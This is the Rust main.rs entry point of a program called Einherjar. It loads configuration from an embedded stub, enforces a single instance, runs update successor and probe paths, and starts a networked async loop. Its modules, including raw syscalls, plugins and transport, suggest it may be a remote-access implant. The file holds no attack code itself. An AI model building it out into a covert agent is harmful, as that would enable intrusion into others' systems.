mod args;
mod auth;
mod log;
mod stub;
mod net;
mod plugin;
mod sys;
#[allow(dead_code, unused_macros)]
mod syscalls;
mod telemetry;
mod text;
mod transport;
mod update;

fn main() {
    dbg_log!("[Startup] Einherjar entry point reached");

    if update::maybe_run_successor() {
        return;
    }
    if update::maybe_run_probe() {
        return;
    }
    let final_ready = match update::final_ready_args() {
        Ok(value) => value,
        Err(_) => std::process::exit(2),
    };
    if !sys::single() {
        dbg_log!("[Startup] Another instance is already running; exiting");
        return;
    }

    dbg_log!("[Config] Loading configuration from embedded stub");
    let args = match args::get() {
        Ok(args) => args,
        Err(error) => {
            dbg_log!("[Config] Configuration load failed: {}", error);
            std::process::exit(2);
        }
    };
    dbg_log!("[Config] Configuration loaded successfully");

    dbg_log!("[Startup] Building async runtime");
    let runtime = match tokio::runtime::Builder::new_multi_thread()
        .worker_threads(2)
        .enable_all()
        .build()
    {
        Ok(runtime) => runtime,
        Err(_) => std::process::exit(1),
    };
    dbg_log!("[Startup] Runtime ready; entering network run loop");
    if runtime.block_on(net::run(&args, final_ready)).is_err() {
        dbg_log!("[Shutdown] Network run loop exited with error");
        std::process::exit(1);
    }
    dbg_log!("[Shutdown] Clean exit");
}
